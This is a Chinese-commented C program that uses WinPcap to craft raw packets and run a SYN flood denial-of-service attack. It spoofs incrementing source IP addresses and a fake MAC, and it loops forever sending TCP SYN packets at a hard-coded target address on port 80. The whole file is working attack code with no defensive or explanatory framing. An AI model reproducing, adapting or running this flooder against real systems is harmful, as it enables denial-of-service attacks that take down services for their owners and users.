#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>  
#include <Ws2tcpip.h>   
#pragma comment(lib,"ws2_32.lib")  
#define SEQ 0x28376839  
int port = 80;//目标端口 
char *DestIP = "192.168.154.128";//目标IP  
char name[1024]={0};//目标网卡
pcap_t *fp;//pcap实例 
u_char *packet;//数据包
char errbuf[PCAP_ERRBUF_SIZE]; //错误缓冲区 
char FAKE_MAC[18]={"80:86:F2:D4:96:E9"};//虚假的MAC地址
char VICTIM_MAC[18]={"00:0C:29:E9:4E:46"};//受害者的MAC地址

#pragma pack (1)
//以太网帧首部
typedef struct _eth_header
{
	unsigned char dst_mac[6];//目标MAC地址 
	unsigned char src_mac[6];//源MAC地址 
	unsigned short type;//帧类型 
}ETH_HEADER;

//TCP首部  
typedef struct tcphdr
{
	USHORT th_sport;//16位源端口号  
	USHORT th_dport;//16位目的端口号  
	unsigned int th_seq;//32位序列号  
	unsigned int th_ack;//32位确认号  
	unsigned char th_lenres;//4位首部长度+6位保留字中的4位  
	unsigned char th_flag;//6位保留字中的2位+6位标志位  
	USHORT th_win;//16位窗口大小  
	USHORT th_sum;//16位效验和  
	USHORT th_urp;//16位紧急数据偏移量  
}TCP_HEADER;

//IP首部  
typedef struct iphdr
{
	unsigned char h_verlen;//4位首部长度+4位IP版本号  
	unsigned char tos;//8位类型服务  
	unsigned short total_len;//16位总长度  
	unsigned short ident;//16位标志  
	unsigned short frag_and_flags;//3位标志位+13位片偏移 
	unsigned char ttl;//8位生存时间  
	unsigned char proto;//8位协议  
	unsigned short checksum;//ip首部效验和  
	unsigned int sourceIP;//伪造的源IP地址  
	unsigned int destIP;//攻击的ip地址  
}IP_HEADER;

//TCP伪首部
struct
{
	unsigned long saddr;//源地址  
	unsigned long daddr;//目的地址  
	char mbz;//置空  
	char ptcl;//协议类型  
	unsigned short tcpl;//TCP长度  
}PSD_HEADER;

typedef struct _ip_packet
{
	ETH_HEADER eth_hdr;
	IP_HEADER ip_hdr;
	TCP_HEADER tcp_hdr;
}IP_PKT;
#pragma pack ()

//计算效验和函数
USHORT checksum(USHORT *buffer, int size)
{
	unsigned long cksum = 0;
	while (size >1)
	{
		cksum += *buffer++;
		size -= sizeof(USHORT);
	}
	if (size) cksum += *(UCHAR*)buffer;
	cksum = (cksum >> 16) + (cksum & 0xffff);
	cksum += (cksum >> 16);
	return (USHORT)(~cksum);
}

//转换mac地址格式
int mac_str_to_bin(char *str, unsigned char *mac)
{
	int i;
	char *s, *e;
	if ((mac == NULL) || (str == NULL))
	{
		return -1;
	}
	s = (char *)str;
	for (i = 0; i < 6; ++i)
	{
		mac[i] = s ? strtoul(s, &e, 16) : 0;
		if (s) s = (*e) ? e + 1 : e;
	}
	return 0;
}

//发送syn包  
int Synflood()
{
	IP_PKT	ip_pkt;
	char	sendBuf[128];
	int ErrorCode = 0, flag = TRUE, TimeOut = 2000, FakeIpNet, FakeIpHost, dataSize = 0, SendSEQ = 0;
	//设置目标地址  
	FakeIpNet = inet_addr(DestIP);
	FakeIpHost = ntohl(FakeIpNet);
	mac_str_to_bin(FAKE_MAC, ip_pkt.eth_hdr.src_mac);
	mac_str_to_bin(VICTIM_MAC, ip_pkt.eth_hdr.dst_mac);
	//上层协议为IP协议，0x0800
	ip_pkt.eth_hdr.type = htons(0x0800);
	//填充IP首部  
	ip_pkt.ip_hdr.h_verlen = (4 << 4 | sizeof(IP_HEADER) / sizeof(unsigned long));
	ip_pkt.ip_hdr.tos = 0;
	ip_pkt.ip_hdr.total_len = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
	ip_pkt.ip_hdr.ident = 1;
	ip_pkt.ip_hdr.frag_and_flags = 0;
	ip_pkt.ip_hdr.ttl = 128;
	ip_pkt.ip_hdr.proto = IPPROTO_TCP;
	ip_pkt.ip_hdr.checksum = 0;
	ip_pkt.ip_hdr.sourceIP = htonl(FakeIpHost + SendSEQ);
	ip_pkt.ip_hdr.destIP = inet_addr(DestIP);
	//填充TCP首部  
	ip_pkt.tcp_hdr.th_dport = htons(port);
	ip_pkt.tcp_hdr.th_sport = htons(8080);
	ip_pkt.tcp_hdr.th_seq = htonl(SEQ + SendSEQ);
	ip_pkt.tcp_hdr.th_ack = 0;
	ip_pkt.tcp_hdr.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
	ip_pkt.tcp_hdr.th_flag = 2;
	ip_pkt.tcp_hdr.th_win = htons(16384);
	ip_pkt.tcp_hdr.th_urp = 0;
	ip_pkt.tcp_hdr.th_sum = 0;
	PSD_HEADER.saddr = ip_pkt.ip_hdr.sourceIP;
	PSD_HEADER.daddr = ip_pkt.ip_hdr.destIP;
	PSD_HEADER.mbz = 0;
	PSD_HEADER.ptcl = IPPROTO_TCP;
	PSD_HEADER.tcpl = htons(sizeof(ip_pkt.tcp_hdr));
	for (;;)
	{
		SendSEQ = (SendSEQ == 65536) ? 1 : SendSEQ + 1;
		ip_pkt.ip_hdr.sourceIP = htonl(FakeIpHost + SendSEQ);
		ip_pkt.tcp_hdr.th_seq = htonl(SEQ + SendSEQ);
		ip_pkt.tcp_hdr.th_sport = htons(SendSEQ);
		PSD_HEADER.saddr = ip_pkt.ip_hdr.sourceIP;
		//把TCP伪首部和TCP首部复制到同一缓冲区并计算TCP效验和  
		memcpy(sendBuf, &PSD_HEADER, sizeof(PSD_HEADER));
		memcpy(sendBuf + sizeof(PSD_HEADER), &ip_pkt.tcp_hdr, sizeof(ip_pkt.tcp_hdr));
		ip_pkt.tcp_hdr.th_sum = checksum((USHORT *)sendBuf, sizeof(PSD_HEADER) + sizeof(ip_pkt.tcp_hdr));
		memcpy(sendBuf, &ip_pkt.ip_hdr, sizeof(ip_pkt.ip_hdr));
		memcpy(sendBuf + sizeof(ip_pkt.ip_hdr), &ip_pkt.tcp_hdr, sizeof(ip_pkt.tcp_hdr));
		memset(sendBuf + sizeof(ip_pkt.ip_hdr) + sizeof(ip_pkt.tcp_hdr), 0, 4);
		ip_pkt.ip_hdr.checksum = checksum((USHORT *)sendBuf, sizeof(ip_pkt.ip_hdr));
		memcpy(sendBuf, &ip_pkt, sizeof(ip_pkt));
		if (pcap_sendpacket(fp, sendBuf, sizeof(ip_pkt)) == 0)
		{
			printf("send successfully.\n");
		}
		else
		{
			printf("error!\n");
		}
	}
	return 0;
}

//获取网卡信息
void get_name()
{
	pcap_if_t *d;
	pcap_if_t *alldevs;
	int i = 0, num = 0;
	char errbuf[PCAP_ERRBUF_SIZE + 1];
	/* Retrieve the device list */
	if (pcap_findalldevs(&alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}
	/* Scan the list printing every entry */
	for (d = alldevs; d; d = d->next, i++)
	{
		printf("%d:%s", i, d->name);
		if (d->description) printf(". %s\n", d->description);
		else printf(". No description available\n");
	}
	printf("press number you want to use!\n");
	scanf("%d", &num);
	for (d = alldevs, i = 0; d && i < num; d = d->next, i++);
	strcpy(name, d->name);
	/* Free the device list */
	pcap_freealldevs(alldevs);
	return;
}

int main()
{
	get_name();
	if ((fp = pcap_open(name, // name of the device 
		65536, // portion of the packet to capture 
		0, //open flag 
		1000, // read timeout 
		NULL, // authentication on the remote machine 
		errbuf // error buffer 
	)) == NULL)
	{
		fprintf(stderr, "\n%s is not supported by WinPcap\n", name);
		return -1;
	}
	Synflood();
	system("pause");
	return 0;
}